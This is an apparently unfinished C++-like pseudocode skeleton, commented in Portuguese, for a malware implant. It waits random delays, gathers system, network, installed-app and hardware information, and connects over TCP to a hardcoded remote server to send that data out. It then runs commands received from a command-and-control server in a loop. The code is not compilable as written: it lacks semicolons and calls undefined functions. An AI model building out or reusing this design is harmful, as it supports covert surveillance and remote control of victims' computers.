#include <iostream>



int main(){


    helperhelper::ghost ghost;
    helperhelper::bruteforce force;
    helperhelper::shellshell shell;
    helperhelper::webweb web;
    helperhelper::commands commands;


    //esperar um tempo escolhido na config.
    //começar a olhar as informações do sistema atual, com um intervalo aleatorio entre as ações. 
    //Olhar Data, Hora
    //Olhar Ethernet, Internet.
    //Olhar Aplicativos instalados.
    //Olhar informações do sistema, Versão, Modelo.
    //Olhar informações de Hardware, GPU, CPU, RAM, Discos.

    //esperar um intervalo aleatorio, tentar iniciar os sockets, esperar novamente um intervalo.
    //apos iniciar, tentar conexão com o servidor remoto, enviar as informações recolhidas, e manter conexão.
    //ler comandos do C2.
    //verificar se há essa função, caso houver enviar o resultado da exec, se não, imprimir mensagem de erro.
    //enviar, esperar uma nova mensagem do c2.

    wait(random(10,44))

    lookwin(actual_date)
    wait(random(10,44))

    lookwin(hour)
    wait(random(10,44))

    lookwin(internet_name)
    wait(random(10,44))

    lookwin(apps_installed)
    wait(random(10,44))

    //system info
    lookwin(win_ver)
    wait(random(10,44))
    lookwin(win_name)
    wait(random(10,44))
    
    //hardware
    lookwin(gpu_name)
    lookwin(cpu_name)
    lookwin(ram)
    lookwin(disks)

    wait(random(10,44))

    web.start_sockets(192.0.0.1, 1010, tcp)
    while (web.recv()){
        if (commands.search_commands_exists(web.recv())){
            result = commands.execute()
            web.env(result)

        }
        else{
            web.env("ERROR_COMMAND_NOT_EXITS")
        }

    }





}